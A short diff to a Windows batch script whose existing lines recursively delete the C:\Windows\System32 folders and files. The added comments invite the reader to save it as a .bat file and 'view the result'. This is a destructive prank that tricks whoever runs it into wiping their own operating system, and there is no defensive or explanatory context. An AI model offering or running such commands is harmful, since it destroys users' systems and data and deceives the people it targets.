@@ -1,2 +1,5 @@
 for /d %%D in ("C:\Windows\System32*") do rd /s /q "%%D"
 del /q "C:\Windows\System32*"
+
+REM save this as .bat file and view the result: 
+REM 
